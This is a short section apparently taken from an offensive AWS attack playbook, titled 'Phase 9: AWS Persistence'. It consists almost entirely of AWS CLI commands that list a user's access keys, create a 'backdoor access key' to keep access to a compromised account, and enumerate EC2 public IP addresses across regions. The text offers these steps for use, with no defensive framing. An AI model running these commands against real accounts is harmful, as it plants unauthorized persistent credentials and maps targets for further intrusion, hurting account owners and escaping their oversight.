# Phase 9: AWS Persistence

Establish persistence in AWS:

```bash
# List existing access keys
aws iam list-access-keys --user-name <username>

# Create backdoor access key
aws iam create-access-key --user-name <username>

# Get all EC2 public IPs
for region in $(cat regions.txt); do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
done
```